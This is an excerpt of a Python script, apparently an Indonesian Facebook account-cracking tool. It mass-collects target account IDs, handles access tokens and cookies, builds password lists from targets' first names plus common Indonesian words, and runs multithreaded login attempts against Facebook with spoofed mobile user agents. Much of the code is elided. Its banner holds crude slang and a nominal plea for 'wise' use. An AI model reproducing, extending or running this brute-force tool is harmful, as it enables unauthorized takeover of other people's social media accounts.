...
pretty.install()
CON=sol()
ugen2=['Mozilla/5.0 (Symbian/3; Series60/5.2 NokiaN8-00/012.002; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/7.3.0 Mobile Safari/533.4 3gpp-gba']
ugen=['Mozilla/5.0 (BlackBerry; U; BlackBerry 9780; en-GB) AppleWebKit/534.8+ (KHTML, like Gecko) Version/6.0.0.546 Mobile Safari/534.8+']
cokbrut=[]
...
for xd in range(10000):
	...
	aa='Mozilla/5.0 (Linux; Android 6.0.1; SM-G532G Build/MMB29T) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.83 Mobile Safari/537.36'
...
def error():
	...
	time.sleep(4)
	os.system("xdg-open https://www.facebook.com/zhieta.naktoraget")
	back()
#-----------------[ HASIL-CRACK ]-----------------#
def result():
...
def dump_massal():
	try:
		...
		exit()
	try:
		jum = int(input('├──> Mau Berapa Target Mass ? : '))
	except ValueError:
...
def token_cookie():
	...
	try:
		n = 0
		header = {'authority':'graph.facebook.com','cache-control':'max-age=0','sec-ch-ua-mobile':'?0','user-agent':'Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12'}
...
#-------------------[ BAGIAN-WORDLIST ]------------#
def passwrd():
	print(f'├──>{m}•{k}•{h}•{x} Sedang Gabut Nungguin Hasil {m}•{k}•{h}•{x} ')
	print('|')
	...
	with tred(max_workers=30) as pool:
		for yuzong in id2:
			...
			frs = nmf.split(' ')[0]
			pwv = ['anjing','kontol','sayang','bangsat']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
...
def crack(idf,pwv):
	...
	ua = random.choice(['Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12']) 
	ua2 = random.choice(['Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12']) 
	ses = requests.Session()
	for pw in pwv:
		try:
...
if __name__=='__main__':
	...
	alvino_xy(f'\n\t{x}——> {h}HALLO TOL\n\t{x}——> {h}GUNAKAN NI SCRIPT DENGAN BIJAK YA TOL\n\t{x}——> {h}RIZZ-XD SEHAT SELALU YAH\n\t{x}——> {h}SEMOGA DIMUDAHKAN REJEKINYA\n\t{x}——> {h}2 3 ACIL LAGI NGEBACOK , TANPA BANYAK CEKCOK...MARI KITA KE SCRIPT NYA.{x}')
	time.sleep(3)
	login()
